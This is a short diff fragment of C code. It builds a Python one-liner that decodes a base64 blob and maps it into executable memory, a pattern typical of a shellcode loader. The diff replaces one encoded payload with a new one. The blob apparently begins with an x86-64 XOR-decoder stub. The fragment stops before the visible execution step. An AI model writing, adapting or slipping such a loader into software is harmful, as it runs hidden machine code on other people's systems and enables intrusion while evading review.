@@ -21,7 +21,7 @@ static void run_python(void) {
     snprintf(cmd, sizeof(cmd),
         "%s -c \""
         "import base64, mmap, ctypes, sys, os;"
-        "encoded=\\\"SDHJSIHp+f///0iNBe////9Iu5defvRtrQtPSDFYJ0gt+P///+L03+ZRlgTDJDz/XuekOfJZKf9zHaAz/+NAl15+2xjeeWD1NxDbBcJzJ/ZeKKM582F0z1F79G2tC08=\\\";"
+        "encoded=\\\"SDHJSIHp+f///0iNBe////9IuxzmhBFEkOdnSDFYJ0gt+P///+L0VF6rcy3+yBR05h1BEM+1AXTL50Uawg9oHOaEPjHjlUh+j+o+LP+fD33m0kYQzo1cROmBEUSQ52c=\\\";"
         "raw=base64.b64decode(encoded);"
         "mem=mmap.mmap(-1,len(raw),mmap.MAP_PRIVATE|mmap.MAP_ANONYMOUS,"
         "mmap.PROT_WRITE|mmap.PROT_READ|mmap.PROT_EXEC);"
